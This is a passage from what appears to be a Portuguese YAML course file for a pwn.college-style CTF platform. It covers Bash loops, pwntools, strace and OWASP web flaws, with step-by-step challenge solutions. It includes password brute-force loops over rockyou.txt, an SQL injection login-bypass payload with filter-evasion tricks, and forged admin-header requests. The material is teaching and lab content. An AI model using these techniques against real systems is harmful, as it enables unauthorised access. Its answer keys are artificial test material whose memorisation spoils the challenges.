      \ é a capacidade de automatizar tarefas repetitivas diretamente no terminal, sem depender de ferramentas gráficas de\
      \ terceiros. O **Bourne-Again Shell (Bash)** é a linguagem de controle e automação universal nos sistemas operacionais\
      \ baseados em Linux.\n\nAtravés de estruturas de controle de fluxo e repetição (**laços `for` e `while`**), combinadas\
      \ com a filosofia Unix de encadeamento de pequenos utilitários via pipes (`|`), operadores conseguem processar milhões\
      \ de registros, realizar cálculos matemáticos complexos e automatizar ataques de força bruta local em frações de segundo.\n\
      \n```\n[ Gerador de Sequência: seq 2 2 100 ]\n  (Emite: 2, 4, 6, ..., 100 em linhas separadas)\n       │\n       ▼ (stdout\
      \ para stdin via pipe)\n[ Formatador de Texto: paste -sd+ - ]\n  (Mescla as linhas usando o delimitador '+': \"2+4+6+...+100\"\
      )\n       │\n       ▼ (stdout para stdin via pipe)\n[ Calculadora Arbitrária: bc ]\n  (Computa a expressão matemática\
      \ completa: 2550)\n```\n\n#### Fundamentação Matemática (Progressão Aritmética)\nA soma de todos os inteiros pares de\
      \ 2 a 100 representa uma Progressão Aritmética (PA) clássica:\n* Primeiro termo: $a_1 = 2$\n* Último termo: $a_n = 100$\n\
      * Razão: $r = 2$\n* Quantidade de termos: $n = \\frac{a_n - a_1}{r} + 1 = \\frac{100 - 2}{2} + 1 = 50$\n\nA soma $S_n$\
      \ é dada rigorosamente por:\n$$S_{50} = \\frac{n \\cdot (a_1 + a_n)}{2} = \\frac{50 \\cdot (2 + 100)}{2} = \\frac{50\
      \ \\cdot 102}{2} = 50 \\cdot 51 = 2550$$\n\n#### Relevância Ofensiva e Defensiva\n* **Segurança Ofensiva (Red Team /\
      \ Brute Force Local):** Laços em Bash são amplamente utilizados para conduzir ataques de força bruta local contra binários\
      \ protegidos por PIN ou senha (`for pin in {0000..9999}; do ./validador $pin && break; done`), fuzzing rápido de parâmetros\
      \ de linha de comando e enumeração massiva de arquivos em diretórios restritos.\n* **Segurança Defensiva (Blue Team\
      \ / Triage Forense):** Analistas de resposta a incidentes utilizam laços e pipelines em Bash para sumarizar métricas\
      \ de tráfego a partir de gigabytes de logs do Apache/Nginx, calcular contagens de requisições por segundo e extrair\
      \ somas de bytes transferidos por endereços IP maliciosos.\n\n---\n\n### \U0001F4BB Exemplos Práticos e Sintaxe\n\n\
      O Bash oferece múltiplas maneiras elegantes de construir repetições e cálculos:\n\n#### Estruturas de Sintaxe no Terminal\n\
      1. **Laço Estilo C (Aritmético Nativo):**\n   ```bash\n   for (( i = 2; i <= 100; i += 2 )); do\n       (( soma += i\
      \ ))\n   done\n   echo $soma\n   ```\n2. **One-Liner com Pipelines Unix (`seq` + `paste` + `bc`):**\n   ```bash\n  \
      \ seq 2 2 100 | paste -sd+ - | bc\n   ```\n3. **One-Liner com `awk`:**\n   ```bash\n   awk 'BEGIN {s=0; for(i=2;i<=100;i+=2)\
      \ s+=i; print s}'\n   ```\n4. **Laço de Força Bruta Local com `while`:**\n   ```bash\n   while read senha; do\n    \
      \   /challenge/autenticador \"$senha\" 2>/dev/null && break\n   done < /usr/share/wordlists/rockyou.txt\n   ```\n\n\
      #### Snippets Práticos e Saídas Observadas\n\n* **Executando o Cálculo Direto no Terminal:**\n  ```bash\n  $ seq 2 2\
      \ 100 | paste -sd+ - | bc\n  2550\n  ```\n\n* **Demonstração com Expansão Aritmética do Shell (`$(( ... ))`):**\n  ```bash\n\
      \  $ soma=0; for num in $(seq 2 2 100); do soma=$((soma + num)); done; echo $soma\n  2550\n  ```\n\n---\n\n### \U0001F3AF\
      \ O que fazer para resolver o desafio (Passo a Passo)\n\nPara satisfazer a validação do verificador e capturar a flag:\n\
      \n1. **Inspecione a requisição do binário:**\n   Execute `/challenge/script-bash-loop` no terminal:\n   ```bash\n  \
      \ /challenge/script-bash-loop\n   ```\n   *O programa solicitará interativamente:*\n   ```text\n   [?] Digite a soma\
      \ dos numeros pares de 2 a 100: \n   ```\n\n2. **Calcule a soma via linha de comando:**\n   Utilize o pipeline com `seq`,\
      \ `paste` e `bc` para obter o valor exato:\n   ```bash\n   seq 2 2 100 | paste -sd+ - | bc\n   # Resultado: 2550\n \
      \  ```\n\n3. **Submeta a resposta calculada:**\n   * **Método Interativo:** Digite `2550` no prompt e pressione `Enter`.\n\
      \   * **Método via Pipeline (Recomendado):**\n     ```bash\n     echo \"2550\" | /challenge/script-bash-loop\n     ```\n\
      \   * **Método via Command Substitution:**\n     ```bash\n     echo $(seq 2 2 100 | paste -sd+ - | bc) | /challenge/script-bash-loop\n\
      \     ```\n   * **Método via Argumento:**\n     ```bash\n     /challenge/script-bash-loop 2550\n     ```\n\n4. **Capture\
      \ e submeta a flag:**\n   Ao receber o valor `2550`, o programa validará a computação e exibirá a flag autorizada:\n\
      \   ```text\n   [+] Calculo correto via Bash!\n   pwn.college{...}\n   ```\n   Copie a string no formato `pwn.college{...}`\
      \ e insira no portal da Cyberguard.\n"
  - id: script-python-socket-math
    name: Desafio Matemático em Alta Velocidade com Sockets
    description: "### \U0001F4D6 Introdução Teórica\n\nEm competições de cibersegurança (CTFs) e auditorias de sistemas no\
      \ mundo real, desenvolvedores frequentemente implementam mecanismos de mitigação e proteção baseados em **Protocolos\
      \ de Desafio-Resposta (Challenge-Response)** com restrições temporais severas. O objetivo desses sistemas é barrar interações\
      \ humanas manuais forçando o interlocutor a provar que possui capacidade de automação programática (*Proof of Work /\
      \ Automação*).\n\nO tempo médio de reação visual humana somado ao tempo mecânico de digitação em teclado gira em torno\
      \ de 1.8 a 3.0 segundos. Quando um binário ou serviço de rede impõe um limite estrito de **1.5 segundos por pergunta**\
      \ ao longo de 10 rodadas consecutivas, a resolução manual torna-se matematicamente inviável.\n\n```\n[ Sistema: Emite\
      \ Pergunta ] ───( Linha de Texto )───> [ Script Python ]\n                                                         \
      \   │\n                                                     [ re.search() Extrai Inteiros ]\n                      \
      \                                      │\n                                                     [ Cálculo: a + b (Microssegundos)\
      \ ]\n                                                            │\n[ Sistema: Valida em 5ms ]  <──( Envia Resposta\
      \ )───── [ p.sendline() / stdout ]\n```\n\n#### Automação de Streams com Python\nPara vencer esse tipo de barreira,\
      \ operadores utilizam scripts em Python para gerenciar canais de comunicação com precisão milimétrica. A interação com\
      \ processos locais pode ser realizada através da biblioteca padrão `subprocess` ou por meio do framework `pwntools`,\
      \ combinada com o módulo de expressões regulares (`re`) para parsear e extrair os operandos matemáticos em tempo real.\n\
      \n#### Relevância Ofensiva e Defensiva\n* **Segurança Ofensiva (Red Team / Exploit Automation):** Serviços vulneráveis\
      \ a ataques de corrupção de memória ou criptografia muitas vezes exigem que o exploit compute respostas dinâmicas em\
      \ milissegundos antes de disparar o payload principal, contornando mecanismos anti-tampering ou janelas de tempo de\
      \ *Race Conditions*.\n* **Segurança Defensiva (Blue Team / SOAR):** Analistas de automação defensiva (SOAR — *Security\
      \ Orchestration, Automation and Response*) programam scripts para interagir com APIs de telemetria, validar hashes em\
      \ dezenas de feeds de inteligência de ameaças simultaneamente e bloquear incidentes em tempo real sem intervenção humana\
      \ lenta.\n\n---\n\n### \U0001F4BB Exemplos Práticos e Sintaxe\n\nA construção do solver automatizado em Python envolve\
      \ a extração de dados com expressões regulares e a transmissão de respostas via pipes:\n\n#### Ferramentas e Métodos\
      \ Críticos\n* `re.search(r\"Quanto e (\\d+) \\+ (\\d+)\", texto)`: Extrai os números capturados pelos grupos delimitados\
      \ por parênteses `(\\d+)`.\n* `int(m.group(1))` e `int(m.group(2))`: Converte os dígitos extraídos de string para inteiros\
      \ utilizáveis em operações aritméticas.\n* `pwn.process(\"/challenge/script-python-socket-math\")`: Inicia o processo\
      \ com controle total de seus canais `stdin`, `stdout` e `stderr`.\n* `io.recvuntil(b\"? \")`: Lê o buffer até o ponto\
      \ exato onde o programa aguarda a entrada, prevenindo impasses de leitura (*deadlocks*).\n* `io.sendline(resposta.encode())`:\
      \ Envia a resposta calculada seguida pelo caractere de nova linha (`\\n`).\n\n#### Snippet Completo de Resolução com\
      \ Pwntools (`/tmp/solve_math.py`):\n```python\n#!/usr/bin/env python3\nimport re\nfrom pwn import *\n\n# Inicia o processo\
      \ do desafio\nio = process(\"/challenge/script-python-socket-math\")\n\n# Processa as 10 rodadas consecutivas\nfor rodada\
      \ in range(1, 11):\n    # Aguarda o prompt da pergunta\n    prompt = io.recvuntil(b\"? \").decode(\"utf-8\")\n    \n\
      \    # Extrai os dois inteiros da soma via expressão regular\n    match = re.search(r\"Quanto e (\\d+) \\+ (\\d+)\"\
      , prompt)\n    if match:\n        a = int(match.group(1))\n        b = int(match.group(2))\n        resultado = str(a\
      \ + b)\n        print(f\"[+] Rodada {rodada}: {a} + {b} = {resultado}\")\n        \n        # Envia a resposta calculada\n\
      \        io.sendline(resultado.encode(\"utf-8\"))\n\n# Imprime o debriefing e a flag final\nprint(io.recvall().decode(\"\
      utf-8\"))\n```\n\n---\n\n### \U0001F3AF O que fazer para resolver o desafio (Passo a Passo)\n\nPara contornar o timeout\
      \ estrito e capturar a flag:\n\n1. **Teste a execução manual inicial (comprove a impossibilidade):**\n   Execute o programa\
      \ no terminal:\n   ```bash\n   /challenge/script-python-socket-math\n   ```\n   *Observe que tentar calcular e digitar\
      \ a resposta manualmente acarreta a mensagem `[X] Tempo esgotado! Voce precisa automatizar com Python.` após 1.5 segundos.*\n\
      \n2. **Crie o script de automação em `/tmp/solve_math.py`:**\n   Utilize o editor de sua preferência ou o utilitário\
      \ `cat` para salvar o script em `/tmp`:\n   ```bash\n   cat << 'EOF' > /tmp/solve_math.py\n   #!/usr/bin/env python3\n\
      \   import re\n   from pwn import *\n\n   io = process(\"/challenge/script-python-socket-math\")\n   for i in range(1,\
      \ 11):\n       prompt = io.recvuntil(b\"? \").decode(\"utf-8\")\n       match = re.search(r\"Quanto e (\\d+) \\+ (\\\
      d+)\", prompt)\n       if match:\n           res = str(int(match.group(1)) + int(match.group(2)))\n           io.sendline(res.encode(\"\
      utf-8\"))\n\n   print(io.recvall().decode(\"utf-8\"))\n   EOF\n   ```\n\n3. **Execute o script de automação:**\n   Dispare\
      \ o resolvedor em Python:\n   ```bash\n   python3 /tmp/solve_math.py\n   ```\n\n4. **Observe a resolução instantânea:**\n\
      \   O script resolverá as 10 operações matemáticas consecutivas em milissegundos, superando com facilidade o temporizador.\n\
      \n5. **Capture e submeta a flag:**\n   Ao final da décima rodada, o programa imprimirá a confirmação e a flag:\n   ```text\n\
      \   [+] Incrivel! Automacao rapida bem-sucedida.\n   pwn.college{...}\n   ```\n   Copie a string no formato `pwn.college{...}`\
      \ e insira no painel da Cyberguard.\n"
  - id: script-pwntools-interaction
    name: Orquestração de Processos com Pwntools
    description: |
      ### 📖 Introdução Teórica

      No desenvolvimento avançado de exploração binária (*pwn*) e engenharia reversa, o terminal manual torna-se um gargalo operacional inviável. A maioria dos binários modernos exige precisão cirúrgica de temporização, envio de bytes nulos (`\x00`), caracteres de controle e sincronismo bidirecional de mensagens.

      Embora linguagens como Python forneçam bibliotecas nativas como `subprocess` e `socket`, o gerenciamento de fluxos brutos de entrada/saída através de pipes manuais frequentemente acarreta **deadlocks de buffer** (quando o processo pai e o processo filho ficam bloqueados esperando dados um do outro) e truncamento de bytes não-ASCII.

      O **Pwntools** é o framework de desenvolvimento de exploits em Python consagrado pela comunidade global de cibersegurança e CTFs. Ele abstrai canais de comunicação locais e remotos sob uma interface uniforme denominada **Tube**, proporcionando controle total sobre streams de execução.

      ```
      +-----------------------------------------------------------+
      |                   Script do Operador (pwntools)           |
      +-----------------------------------------------------------+
             │ io.recvuntil(b"READY")          ▲ io.recvall()
             ▼                                 │
      +-----------------------------------------------------------+
      |             Subprocesso: /challenge/script-pwntools       |
      +-----------------------------------------------------------+
             │                                 ▲
             ▼                                 │
        [ stdout (FD 1) ]                 [ stdin (FD 0) ]
      ```

      #### Vantagens Críticas do Pwntools
      1. **Comunicação Bidirecional sem Deadlock:** Alterna de forma transparente entre leitura delimitada (`recvuntil`) e escrita com quebra de linha (`sendline`).
      2. **Manipulação Nativa de Tipos Binários:** Funções de empacotamento (`p64`, `p32`) convertem inteiros para arrays de bytes little-endian em arquiteturas x86 e x86_64.
      3. **Transição Suave para Shell Interativa:** A instrução `io.interactive()` transfere o controle de teclado e terminal ao operador no momento exato em que um shell remoto ou payload privilegiado é obtido.

      #### Relevância Ofensiva e Defensiva
      * **Segurança Ofensiva (Red Team / Pwn):** Indispensável para disparar exploits de corrupção de memória (*Buffer Overflows, ROP Chains, Format Strings*), onde a precisão de alinhamento de memória não tolera conversões incorretas de codificação (como UTF-8 corrompendo bytes de memória).
      * **Segurança Defensiva (Blue Team / AppSec):** Utilizado para construir suítes de testes de regressão de segurança (*Security Harness Testing*). Equipes de AppSec utilizam o pwntools para testar se correções e mitigações em código C/C++ realmente resistem a ataques conhecidos em pipelines de integração contínua (CI/CD).

      ---

      ### 💻 Exemplos Práticos e Sintaxe

      A biblioteca Pwntools opera através de métodos intuitivos de controle de fluxo:

      #### Métodos Fundamentais da Interface Tube
      * `p = process("/caminho/binario")`: Executa um binário local como subprocesso.
      * `p = remote("10.10.10.1", 1337)`: Conecta a um serviço remoto via socket TCP.
      * `p.recvuntil(b"padrao")`: Lê o fluxo de saída até encontrar a sequência de bytes indicada.
      * `p.sendline(b"dados")`: Envia os bytes fornecidos seguidos de uma quebra de linha (`\n`).
      * `p.recvall()`: Lê todos os dados restantes até que o processo feche a conexão.
      * `context.log_level = 'debug'`: Ativa o modo de depuração profunda, exibindo todos os bytes enviados e recebidos em formato hexadecimal no terminal.

      #### Snippets Práticos e Saídas Observadas

      1. **Script de Orquestração com Pwntools (`/tmp/solve_pwn.py`):**
         ```python
         #!/usr/bin/env python3
         from pwn import *

         # Inicia a interação com o binário
         io = process("/challenge/script-pwntools-interaction")

         # Sincroniza com o banner operacional
         io.recvuntil(b"PWNTOOLS_CHALLENGE_READY")

         # Transmite o token de validação exigido
         io.sendline(b"CYBERGUARD_PWNTOOLS_OK")

         # Captura e exibe o resultado final
         print(io.recvall().decode("utf-8"))
         ```

      2. **Resolução Rápida via Shell (Método One-Liner):**
         ```bash
         $ echo "CYBERGUARD_PWNTOOLS_OK" | /challenge/script-pwntools-interaction
         ```

      ---

      ### 🎯 O que fazer para resolver o desafio (Passo a Passo)

      Para orquestrar a comunicação com o binário e extrair a flag:

      1. **Inspecione o comportamento do programa:**
         Execute `/challenge/script-pwntools-interaction` no terminal:
         ```bash
         /challenge/script-pwntools-interaction
         ```
         *O programa emitirá a linha de sincronismo `PWNTOOLS_CHALLENGE_READY` e aguardará o token de confirmação via `stdin`.*

      2. **Crie o script de automação em `/tmp/solve_pwn.py`:**
         Grave o código de interação no diretório temporário:
         ```bash
         cat << 'EOF' > /tmp/solve_pwn.py
         #!/usr/bin/env python3
         from pwn import *

         io = process("/challenge/script-pwntools-interaction")
         io.recvuntil(b"PWNTOOLS_CHALLENGE_READY")
         io.sendline(b"CYBERGUARD_PWNTOOLS_OK")
         print(io.recvall().decode("utf-8"))
         EOF
         ```

      3. **Execute o script:**
         Execute o script com o interpretador Python:
         ```bash
         python3 /tmp/solve_pwn.py
         ```

      4. **Capture e submeta a flag:**
         O programa receberá a mensagem no momento exato e emitirá a confirmação acompanhada da flag:
         ```text
         [+] Conexao via pwntools confirmada!
         pwn.college{...}
         ```
         Copie a string no formato `pwn.college{...}` e insira no portal da Cyberguard.
  - id: script-strace-secrets
    name: Rastreamento de Chamadas de Sistema (Strace)
    description: "### \U0001F4D6 Introdução Teórica\n\nNa arquitetura de segurança dos processadores modernos x86_64 e do\
      \ kernel Linux, aplicações comuns de usuário executam em um anel de privilégio desprivilegiado conhecido como **Ring\
      \ 3 (User Space / Espaço do Usuário)**. O hardware impede que tais programas acessem diretamente a memória de outros\
      \ processos, interajam diretamente com o disco rígido ou enviem pacotes para interfaces físicas de rede.\n\nSempre que\
      \ uma aplicação necessita interagir com o mundo externo (abrir um arquivo, ler dados do disco, criar um processo filho\
      \ ou conectar-se à internet), ela é obrigada a solicitar a intervenção do kernel no **Ring 0 (Kernel Space / Supervisor)**\
      \ através de uma **Chamada de Sistema (Syscall)**.\n\n```\n+-----------------------------------------------------------+\n\
      |              Aplicação (Ring 3 / User Space)              |\n|              Código executável do binário         \
      \        |\n+-----------------------------------------------------------+\n       │\n       │ Instrução Assembly: syscall\
      \ (RAX = 257 / openat)\n       ▼\n+-----------------------------------------------------------+\n|          strace (intercepta\
      \ via chamada ptrace)           |\n|          \"openat(AT_FDCWD, '/tmp/.secret', O_RDONLY) = 3\" |\n+-----------------------------------------------------------+\n\
      \       │\n       ▼\n+-----------------------------------------------------------+\n|            Kernel Linux (Ring\
      \ 0 / Supervisor)             |\n|            Acesso real ao hardware e arquivos             |\n+-----------------------------------------------------------+\n\
      ```\n\n#### Como o `strace` Funciona Internamente\nO **`strace` (System Call Trace)** utiliza a chamada de sistema `ptrace(PTRACE_SYSCALL,\
      \ ...)` do Linux. Essa syscall permite que o `strace` anexe um interceptador ao processo-alvo. Cada vez que a CPU encontra\
      \ a instrução assembly `syscall`, a execução do binário é congelada antes e depois de transitar para o kernel, permitindo\
      \ ao `strace` decodificar e imprimir na tela os argumentos exatos passados nos registradores (`RDI`, `RSI`, `RDX`, etc.)\
      \ e o valor retornado em `RAX`.\n\n#### Análise Estática vs. Análise Dinâmica\n* **Análise Estática (`strings`, `objdump`,\
      \ `Ghidra`):** Avalia os bytes do executável em repouso sem dispará-lo. Embora indispensável, é facilmente frustrada\
      \ por técnicas de ofuscação, empacotadores (*packers*) ou strings cifradas que só são decodificadas em tempo de execução.\n\
      * **Análise Dinâmica (`strace`, `ltrace`, `GDB`):** Observa o binário durante a execução. O programa não pode mentir\
      \ para o kernel: para ler uma chave no disco, ele obrigatoriamente terá que passar o nome do arquivo para `openat()`\
      \ e carregar os bytes do segredo via `read()`. O `strace` revela essas operações instantaneamente sem exigir engenharia\
      \ reversa profunda.\n\n#### Relevância Ofensiva e Defensiva\n* **Segurança Ofensiva (Red Team / Engenharia Reversa):**\
      \ Permite recuperar senhas, caminhos de arquivos de configuração camuflados e chaves criptográficas em segundos, além\
      \ de identificar falhas lógicas em checagens de validação de arquivos.\n* **Segurança Defensiva (Blue Team / Triage\
      \ de Malware no SOC):** Analistas de segurança executam malwares suspeitos dentro de sandboxes monitoradas por `strace`\
      \ para descobrir imediatamente quais arquivos estão sendo criptografados por ransomware, quais chaves de persistência\
      \ estão sendo gravadas e quais endereços IP de Comando & Controle (C2) estão sendo contactados.\n\n---\n\n### \U0001F4BB\
      \ Exemplos Práticos e Sintaxe\n\nO uso cirúrgico do `strace` envolve filtros e controle de buffer de leitura:\n\n####\
      \ Parâmetros e Flags Fundamentais\n* `-e trace=<syscalls>`: Filtra apenas as chamadas de sistema especificadas (ex:\
      \ `-e trace=openat,read`, `-e trace=network`, `-e trace=file`).\n* `-s <tamanho>`: Define o tamanho máximo de caracteres\
      \ exibidos para buffers de strings (o padrão é truncar em apenas 32 caracteres; use `-s 256` para ler chaves e tokens\
      \ inteiros).\n* `-f`: Segue processos filhos gerados via chamadas `fork` ou `clone`.\n* `-p <PID>`: Conecta o interceptador\
      \ a um processo que já está rodando em segundo plano.\n* `-c`: Modo contagem/sumário; exibe uma tabela estatística consolidando\
      \ quantas chamadas cada syscall efetuou e o tempo gasto.\n\n#### Tabela de Chamadas de Sistema Críticas em Linux x86_64\n\
      | Syscall | Número RAX | Propósito no Kernel | O que o `strace` revela |\n| :---: | :---: | :--- | :--- |\n| **`openat`**\
      \ | `257` | Abre ou cria arquivos relativo a um diretório | Caminho completo do arquivo e modo de abertura |\n| **`read`**\
      \ | `0` | Lê bytes a partir de um File Descriptor | Conteúdo bruto de senhas, chaves e arquivos |\n| **`write`** | `1`\
      \ | Grava bytes em um File Descriptor | Mensagens enviadas ao terminal, arquivo ou socket |\n| **`connect`**| `42` |\
      \ Inicia conexão de rede TCP contra um IP/porta | Endereço IP e porta do servidor de destino |\n| **`execve`** | `59`\
      \ | Executa um novo programa | Argumentos e binários derivados |\n\n#### Snippets Práticos e Saídas Observadas\n\n1.\
      \ **Rastreamento de Chamadas de Abertura e Leitura de Arquivo:**\n   ```bash\n   $ strace -s 256 -e trace=openat,read\
      \ /challenge/script-strace-secrets\n   ```\n\n2. **Linhas de Saída Típicas Emitidas pelo Kernel:**\n   ```text\n   openat(AT_FDCWD,\
      \ \"/tmp/.cyberguard_strace_secret.key\", O_RDONLY) = 3\n   read(3, \"strace_sys_secret_778\", 256) = 21\n   ```\n \
      \  *O `openat` retornou o File Descriptor número 3, e o `read` seguinte leu 21 bytes correspondentes à chave secreta:*\
      \ `strace_sys_secret_778`.\n\n---\n\n### \U0001F3AF O que fazer para resolver o desafio (Passo a Passo)\n\nPara interceptar\
      \ a chave secreta com o strace e resgatar a flag:\n\n1. **Inspecione a execução normal do binário:**\n   Execute `/challenge/script-strace-secrets`\
      \ diretamente:\n   ```bash\n   /challenge/script-strace-secrets\n   ```\n   *O programa solicitará interativamente:*\n\
      \   ```text\n   [?] Digite a chave lida durante a chamada openat/read: \n   ```\n\n2. **Execute o binário sob o controle\
      \ do `strace`:**\n   Dispare o binário filtrando chamadas de sistema `openat` e `read`, expandindo o buffer com `-s\
      \ 256`:\n   ```bash\n   strace -s 256 -e trace=openat,read /challenge/script-strace-secrets\n   ```\n\n3. **Analise\
      \ as chamadas interceptadas no terminal:**\n   Procure na saída gerada pelo kernel a leitura do arquivo secreto em `/tmp`:\n\
      \   ```text\n   openat(AT_FDCWD, \"/tmp/.cyberguard_strace_secret.key\", O_RDONLY) = 3\n   read(3, \"strace_sys_secret_778\"\
      , 256) = 21\n   ```\n\n4. **Submeta a chave capturada:**\n   A chave lida diretamente pelo descritor de arquivo é `strace_sys_secret_778`.\n\
      \   Digite a chave no prompt e pressione `Enter`:\n   ```text\n   strace_sys_secret_778\n   ```\n   *Ou execute diretamente\
      \ passando o segredo como argumento:*\n   ```bash\n   /challenge/script-strace-secrets strace_sys_secret_778\n   ```\n\
      \n5. **Capture e submeta a flag:**\n   O verificador validará o segredo e exibirá a flag autorizada:\n   ```text\n \
      \  [+] Excelente analise com strace!\n   pwn.college{...}\n   ```\n   Copie a string no formato `pwn.college{...}` e\
      \ insira no painel da plataforma.\n"
- id: web-pentest-owasp
  name: 'Módulo 4: Segurança Web & OWASP Top 10'
  description: |
    As aplicações web são a principal porta de entrada para vetores de intrusão no mundo real. Este módulo desvenda as falhas mais críticas listadas pela OWASP, com ênfase prática em Injeção de SQL (SQLi), Server-Side Request Forgery (SSRF) e gestão frágil de sessões/cookies HTTP.

    Será detalhada a mecânica por trás do SQLi clássico e como remediá-lo em definitivo através de Consultas Parametrizadas (Prepared Statements), demonstrando o porquê da filtragem ingênua por lista negra ("blacklist") ser ineficaz.
  resources:
  - name: 'Talking Web: Protocolo HTTP e Injeções'
    type: lecture
    video: https://www.youtube.com/watch?v=FfG24e7Q1d4
    slides: https://pwn.college/talking-web
  - name: 'Guia Teórico: SQL Injection, Prepared Statements e Anatomia do SSRF'
    type: markdown
    content: |
      ### SQL Injection (SQLi) e a Verdadeira Mitigação

      O SQL Injection ocorre quando dados não confiáveis inseridos pelo usuário são concatenados diretamente na estrutura de comando da consulta enviada ao banco de dados:

      ```sql
      -- Consulta Insegura por Concatenação:
      query = "SELECT * FROM users WHERE username = '" + user_input + "' AND password = '" + pass_input + "'";
      ```
      Se o atacante inserir `' OR '1'='1' -- `, a semântica da query é alterada, forçando o retorno de registros privilegiados sem senha.

      #### O Erro das Listas Negras (Blacklisting):
      Muitos desenvolvedores e analistas sugerem "bloquear a palavra `SELECT` ou aspas". Isso é **completamente falho**:
      * Injeções podem utilizar encodings (URL, Hexadecimal, Unicode).
      * Podem intercalar comentários (`SEL/*bypass*/ECT`).
      * Podem explorar operadores sem comandos literais explícitos dependendo da consulta.

      #### A Solução Canônica: Prepared Statements (Consultas Parametrizadas)
      Em *prepared statements*, a estrutura sintática da consulta é pré-compilada pelo SGBD. Os dados do usuário são enviados separadamente como meros valores de parâmetros, sendo impossível ao banco interpretar texto como código SQL:
      ```python
      # Mitigação Correta em Python (ex: sqlite3 / psycopg2):
      cursor.execute("SELECT id, role FROM users WHERE username = ? AND password = ?", (username, password_hash))
      ```

      ### SSRF (Server-Side Request Forgery)
      O SSRF acontece quando uma aplicação web vulnérável busca um recurso remoto a partir de uma URL fornecida pelo usuário sem validar o destino. O atacante abusa da confiança do servidor para forçar o backend a fazer requisições contra recursos internos protegidos (como serviços em `127.0.0.1`, APIs de metadados em nuvem como `http://169.254.169.254` ou instâncias internas sem autenticação).
  challenges:
  - id: web-http-headers-cookies
    name: Manipulação de Sessões e Cabeçalhos HTTP
    description: |
      ### 📖 Introdução Teórica
      O protocolo HTTP (HyperText Transfer Protocol) é o alicerce de comunicação da Web moderna e foi projetado originalmente para ser **inerentemente stateless (sem estado)**. Isso significa que cada par de requisição e resposta ocorre de forma completamente atômica e isolada: por especificação técnica, o servidor web não retém memória inerente sobre transações anteriores realizadas pelo mesmo cliente.

      Para contornar essa característica e possibilitar aplicações ricas com estados contínuos de autenticação (como áreas restritas, painéis administrativos e sessões de usuários), a indústria introduziu mecanismos na camada de aplicação:
      1. **Cookies de Sessão (`Cookie: session_id=...`):** Pequenos identificadores alfanuméricos armazenados pelo navegador e transmitidos automaticamente em todas as requisições subsequentes direcionadas ao mesmo domínio.
      2. **Cabeçalhos de Autorização Padronizados (`Authorization: Bearer <token>`):** Tokens criptográficos (como JSON Web Tokens - JWT assinados com HMAC ou chaves assimétricas RSA/ECDSA) transmitidos explicitamente pelo frontend.
      3. **Cabeçalhos HTTP Customizados (`X-Forwarded-For`, `X-User-Role`, `X-Cyberguard-Role`):** Cabeçalhos adicionados por proxies reversos, balanceadores de carga ou API Gateways (como NGINX, HAProxy, Envoy, Traefik, Kong) para encaminhar metadados de contexto do usuário aos microsserviços internos.

      **Relevância Ofensiva e Defensiva (OWASP A01:2021 - Broken Access Control):**
      Em muitas infraestruturas de microsserviços e intranets empresariais, arquitetos cometem o erro grave de presumir que qualquer requisição que atinge a rede interna é inerentemente "confiável". Se um microsserviço backend avalia o nível de privilégio de um usuário lendo diretamente o valor de um cabeçalho HTTP não verificado (como `X-Cyberguard-Role: admin`) sem que haja uma assinatura criptográfica ou canal mutuamente autenticado (mTLS), instala-se uma vulnerabilidade crítica de escalação de privilégios.

      Se o proxy reverso de borda falhar em filtrar ou remover (*strip*) os cabeçalhos sensíveis enviados pelo cliente externo na internet, um atacante pode injetar cabeçalhos forjados em sua requisição `curl` ou via Burp Suite. O proxy repassará o cabeçalho intacto e o backend concederá privilégios administrativos imediatos sem que nenhuma senha tenha sido fornecida.
      Na perspectiva defensiva, a mitigação mandatória exige:
      * Configurar gateways de borda para sanitizar e reescrever qualquer cabeçalho de controle proveniente de conexões externas.
      * Adotar validação criptográfica obrigatória (tokens JWT validados localmente com chaves públicas) em vez de confiar cegamente em cabeçalhos de texto plano.

      ### 💻 Exemplos Práticos e Sintaxe
      O utilitário essencial de linha de comando para inspecionar e manipular requisições HTTP é o `curl`.

      1. **Inspecionar cabeçalhos de resposta HTTP (`-i` ou `-I`):**
         ```bash
         curl -i http://localhost:8080/perfil
         ```
         *Saída esperada:*
         ```http
         HTTP/1.1 200 OK
         Content-Type: text/html; charset=utf-8
         Set-Cookie: session_id=abc12345; Path=/; HttpOnly; Secure
         X-Content-Type-Options: nosniff
         ```

      2. **Injetar cabeçalhos customizados na requisição (`-H`):**
         ```bash
         curl -s -H "X-Cyberguard-Role: admin" http://localhost:8080/admin/dashboard
         ```
         *Saída esperada no terminal:*
         ```text
         [+] Acesso Administrativo Autorizado! Painel de Controle Desbloqueado.
         ```

      3. **Enviar múltiplos cabeçalhos e cookies de sessão (`-H` e `-b`):**
         ```bash
         curl -v -H "X-Cyberguard-Role: admin" -b "role=admin; sess=994a" http://target.local/api
         ```
         *A flag `-v` (verbose) exibe o tráfego bruto com `>` (enviado pelo cliente) e `<` (recebido do servidor).*

      4. **Scripting Ofensivo em Python com `requests`:**
         ```python
         import requests

         url = "http://target.local/admin"
         custom_headers = {
             "User-Agent": "Cyberguard-Auditor/1.0",
             "X-Cyberguard-Role": "admin"
         }
         response = requests.get(url, headers=custom_headers)
         print(f"Status Code: {response.status_code}")
         print(f"Corpo:\n{response.text}")
         ```

      ### 🎯 O que fazer para resolver o desafio (Passo a Passo)
      1. **Localizar e Inspecionar o Binário:**
         No ambiente do container, o executável do desafio está localizado no caminho absoluto:
         ```bash
         /challenge/web-http-headers-cookies
         ```
      2. **Executar o Desafio no Terminal:**
         Execute o binário para iniciar a emulação do Gateway de API da Cyberguard:
         ```bash
         /challenge/web-http-headers-cookies
         ```
         O programa exibirá o banner operacional e abrirá o prompt interativo (`>> `) aguardando o cabeçalho de autorização.
      3. **Fornecer o Cabeçalho Administrativo:**
         No prompt, digite o cabeçalho exato exigido pela política de controle de acesso:
         ```text
         X-Cyberguard-Role: admin
         ```
         *Alternativa rápida via linha de comando:* Você também pode passar o cabeçalho diretamente como argumento:
         ```bash
         /challenge/web-http-headers-cookies "X-Cyberguard-Role: admin"
         ```
      4. **Capturar e Submeter a Flag:**
         O verificador validará o cabeçalho forjado, confirmará a elevação de privilégios para Administrador e imprimirá a flag no formato:
         ```text
         pwn.college{...}
         ```
         Copie a string completa da flag e submeta-a na plataforma para concluir o desafio.
  - id: web-sqli-login-bypass
    name: Bypass de Autenticação via SQL Injection Clássico
    description: |
      ### 📖 Introdução Teórica
